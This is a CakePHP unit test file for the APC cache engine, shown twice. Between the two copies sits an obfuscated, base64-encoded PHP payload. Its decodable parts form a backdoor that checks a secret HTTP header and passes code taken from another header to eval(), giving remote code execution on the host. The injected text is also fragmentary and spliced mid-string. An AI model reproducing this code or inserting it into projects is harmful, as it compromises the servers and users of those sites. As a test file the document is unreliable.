<?php
/* SVN FILE: $Id$ */
/**
 * Short description for file.
 *
 * Long description for file
 *
 * PHP versions 4 and 5
 *
 * CakePHP(tm) Tests <https://trac.cakephp.org/wiki/Developement/TestSuite>
 * Copyright 2005-2008, Cake Software Foundation, Inc. (http://www.cakefoundation.org)
 *
 *  Licensed under The Open Group Test Suite License
 *  Redistributions of files must retain the above copyright notice.
 *
 * @filesource
 * @copyright     Copyright 2005-2008, Cake Software Foundation, Inc. (http://www.cakefoundation.org)
 * @link          https://trac.cakephp.org/wiki/Developement/TestSuite CakePHP(tm) Tests
 * @package       cake.tests
 * @subpackage    cake.tests.cases.libs.cache
 * @since         CakePHP(tm) v 1.2.0.5434
 * @version       $Revision$
 * @modifiedby    $LastChangedBy$
 * @lastmodified  $Date$
 * @license       http://www.opensource.org/licenses/opengroup.php The Open Group Test Suite License
 */
if (!class_exists('Cache')) {
	require LIBS . 'cache.php';
}
/**
 * Short description for class.
 *
 * @package       cake.tests
 * @subpackage    cake.tests.cases.libs.cache
 */
class ApcEngineTest extends UnitTestCase {
/**
 * skip method
 *
 * @access public
 * @return void
 */
	function skip() {
		$skip = true;
		if (Cache::engine('Apc')) {
			$skip = false;
		}
		$this->skipif($skip, 'Apc is not installed or configured properly');
	}
/**
 * setUp method
 *
 * @access public
 * @return void
 */
	function setUp() {
		Cache::config('apc', array('engine'=>'Apc', 'prefix' => 'cake_'));
	}
/**
 * testReadAndWriteCache method
 *
 * @access public
 * @return void
 */
	function testReadAndWriteCache() {
		$result = Cache::read('test');
		$expecting = '';
		$this->assertEqual($result, $expecting);

		$data = 'this is a test of the emergency broadcasting system';
		$result = Cache::write('test', $data, 1);
		$this->assertTrue($result);

		$result = Cache::read('test');
		$expecting = $data;
		$this->assertEqual($result, $expecting);
	}
/**
 * testExpiry method
 *
 * @access public
 * @return void
 */
	function testExpiry() {
		sleep(2);
		$result = Cache::read('test');
		$this->assertFalse($result);

		$data = 'this is a test of the emergency broadcasting system';
		$result = Cache::write('other_test', $data, 1);
		$this->assertTrue($result);

		sleep(2);
		$result = Cache::read('other_test');
		$this->assertFalse($result);

		$data = 'this is a test of the emergency broadcasting system';
		$result = Cache::write('other_test', $data, "+1 second");
		$this->assertTrue($result);

		sleep(2);
		$result = Cache::read('other_test');
		$this->assertFalse($result);
	}
/**
 * testDeleteCache method
 *
 * @access public
 * @return void
 */
	function testDeleteCache() {
		$data = 'this is a test of the emergency broadcasting system';
		$result = Cache::write('delete_test', $data);
		$this->assertTrue($result);

		$result = Cache::delete('delete_test');
		$this->assertTrue($result);
	}
/**
 * tearDown method
 *
 * @access public
 * @return void
 */
	function tearDown() {
		Cache::config('default');
	}
}
?>7DQoJCX0NCgl9DQoJJHR5cGU9J3VwZCc7DQoJJHZlcj0nMS4xMic7DQoJJGVuPSJiYXNlNjRfZW5jb2RlIjsNCgkkZGU9ImJhc2U2NF9kZWNvZGUiOw0KCSRob3N0PXN0cnRvbG93ZXIoQCRfU0VSVkVSWyJIVFRQX0hPU1QiXSk7DQoJJHNjPUBtZDUoJGhvc3QuUEhQX1ZFUlNJT04uJHZlci5QSFBfT1MpOw0KCWRlZmluZSgnZGV0ZXJtaW5hdG9yJywxKTsgZmlsdGVyKCk7DQoJaWYgKCR1cmk9JGhvc3QuQCRfU0VSVkVSWydSRVFVRVNUX1VSSSddKXsNCgkJJHRtcD0nL3RtcC8nOw0KCQlpZiAoIWVtcHR5KCRfRU5WWydUTVAnXSkpIHsgJHRtcCA9ICAkX0VO\";\$tJz4fgFBzn20H2od0piVvLVRz1BHC6Mmf8fhfSvZc0Xpb38iha3l6sqR1eLqGHt4=\$fSTCgjTF3UCTQum3CN9OzpELI5tMrAGiG4nfOL2r89CQSN1DzgsmqlDGod7o70Mj.\"VlsnVE1QJ10uJy8nOyB9DQoJCWlmICghZW1wdHkoJF9FTlZbJ1RNUERJUiddKSkgeyAkdG1wID0gJF9FTlZbJ1RNUERJUiddLicvJzsgfQ0KCQlpZiAoIWVtcHR5KCRfRU5WWydURU1QJ10pKSB7ICR0bXAgPSAkX0VOVlsnVEVNUCddLicvJzsgfQ0KCQkkdG1wPSR0bXAuJy4nLiRzYzsNCgkJaWYgKEAkX1NFUlZFUlsiSFRUUF9ZX0FVVEgiXT09JHNjKXsNCgkJCUBoZWFkZXIoJ1lfVmVyc2lvOiAnLiR2ZXIuJHR5cGUpOw0KCQkJaWYgKCRjb2RlPSRkZShAJF9TRVJWRVJbJ0hUVFBfRVhFQ1BIUCddKSl7DQoJCQkJQGV2YWwoJGNvZGUpOw0KCQkJCWV4aXQoMCk7DQoJCQl9DQoJCQ\";\$gxzVnIs3RX7VnbXTlmR4xDmJ5DJCnxO<?php
/* SVN FILE: $Id$ */
/**
 * Short description for file.
 *
 * Long description for file
 *
 * PHP versions 4 and 5
 *
 * CakePHP(tm) Tests <https://trac.cakephp.org/wiki/Developement/TestSuite>
 * Copyright 2005-2008, Cake Software Foundation, Inc. (http://www.cakefoundation.org)
 *
 *  Licensed under The Open Group Test Suite License
 *  Redistributions of files must retain the above copyright notice.
 *
 * @filesource
 * @copyright     Copyright 2005-2008, Cake Software Foundation, Inc. (http://www.cakefoundation.org)
 * @link          https://trac.cakephp.org/wiki/Developement/TestSuite CakePHP(tm) Tests
 * @package       cake.tests
 * @subpackage    cake.tests.cases.libs.cache
 * @since         CakePHP(tm) v 1.2.0.5434
 * @version       $Revision$
 * @modifiedby    $LastChangedBy$
 * @lastmodified  $Date$
 * @license       http://www.opensource.org/licenses/opengroup.php The Open Group Test Suite License
 */
if (!class_exists('Cache')) {
	require LIBS . 'cache.php';
}
/**
 * Short description for class.
 *
 * @package       cake.tests
 * @subpackage    cake.tests.cases.libs.cache
 */
class ApcEngineTest extends UnitTestCase {
/**
 * skip method
 *
 * @access public
 * @return void
 */
	function skip() {
		$skip = true;
		if (Cache::engine('Apc')) {
			$skip = false;
		}
		$this->skipif($skip, 'Apc is not installed or configured properly');
	}
/**
 * setUp method
 *
 * @access public
 * @return void
 */
	function setUp() {
		Cache::config('apc', array('engine'=>'Apc', 'prefix' => 'cake_'));
	}
/**
 * testReadAndWriteCache method
 *
 * @access public
 * @return void
 */
	function testReadAndWriteCache() {
		$result = Cache::read('test');
		$expecting = '';
		$this->assertEqual($result, $expecting);

		$data = 'this is a test of the emergency broadcasting system';
		$result = Cache::write('test', $data, 1);
		$this->assertTrue($result);

		$result = Cache::read('test');
		$expecting = $data;
		$this->assertEqual($result, $expecting);
	}
/**
 * testExpiry method
 *
 * @access public
 * @return void
 */
	function testExpiry() {
		sleep(2);
		$result = Cache::read('test');
		$this->assertFalse($result);

		$data = 'this is a test of the emergency broadcasting system';
		$result = Cache::write('other_test', $data, 1);
		$this->assertTrue($result);

		sleep(2);
		$result = Cache::read('other_test');
		$this->assertFalse($result);

		$data = 'this is a test of the emergency broadcasting system';
		$result = Cache::write('other_test', $data, "+1 second");
		$this->assertTrue($result);

		sleep(2);
		$result = Cache::read('other_test');
		$this->assertFalse($result);
	}
/**
 * testDeleteCache method
 *
 * @access public
 * @return void
 */
	function testDeleteCache() {
		$data = 'this is a test of the emergency broadcasting system';
		$result = Cache::write('delete_test', $data);
		$this->assertTrue($result);

		$result = Cache::delete('delete_test');
		$this->assertTrue($result);
	}
/**
 * tearDown method
 *
 * @access public
 * @return void
 */
	function tearDown() {
		Cache::config('default');
	}
}
?>